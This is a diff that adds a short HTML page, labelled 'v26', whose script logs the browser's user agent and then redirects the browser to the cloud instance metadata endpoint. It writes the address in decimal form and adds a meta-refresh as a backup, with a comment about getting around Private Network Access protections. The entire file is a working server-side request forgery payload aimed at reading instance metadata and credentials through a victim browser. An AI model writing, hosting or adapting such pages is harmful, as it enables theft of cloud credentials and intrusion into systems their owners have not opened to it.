@@ -1,0 +1,14 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v26</title>
+<style>body{font:20px monospace}</style></head>
+<body><pre id="r">v26 nav to IMDS decimal in 2s</pre>
+<script>
+document.getElementById('r').textContent += '\nUA '+navigator.userAgent.slice(0,60);
+// Top-level navigation to link-local via decimal (PNA may not apply to top-level)
+setTimeout(function(){
+  location.replace('http://2852039166/latest/meta-data/');
+}, 2000);
+// Also try meta refresh backup
+var m=document.createElement('meta');
+m.httpEquiv='refresh'; m.content='3;url=http://2852039166/latest/meta-data/';
+document.head.appendChild(m);
+</script></body></html>
